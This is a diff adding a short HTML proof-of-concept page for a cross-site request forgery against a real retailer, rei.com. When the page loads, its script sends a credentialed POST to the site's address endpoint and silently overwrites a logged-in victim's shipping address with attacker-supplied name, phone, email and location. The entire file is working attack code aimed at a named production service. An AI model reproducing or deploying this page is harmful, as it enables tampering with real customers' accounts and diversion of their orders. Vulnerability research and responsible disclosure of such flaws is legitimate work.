@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF PoC - REI Address Change</title>
+</head>
+<body>
+  <h1>CSRF Exploit Triggered</h1>
+  <p>If victim is logged into rei.com, address will be changed silently.</p>
+  <script>
+    fetch("https://www.rei.com/rest/user/address", {
+      method: "POST",
+      credentials: "include", // هذا يرسل الكوكيز مع الطلب
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        "addressIdAsString":"855241928984568832",
+        "addressType":"SB",
+        "firstName":"attacker",
+        "lastName":"blg",
+        "phone1":"(070) 995-7392",
+        "email1":"d54e0fa02d@emailvb.pro",
+        "addressLine1":"45amiccal",
+        "addressLine2":"",
+        "city":"casa",
+        "stateCode":"",
+        "zipCode":"15000",
+        "countryName":"Austria",
+        "scrubStatus":"USER_ADDRESS",
+        "addressId":"855241928984568832"
+      })
+    }).then(res => res.text()).then(console.log).catch(console.error);
+  </script>
+</body>
+</html>
+
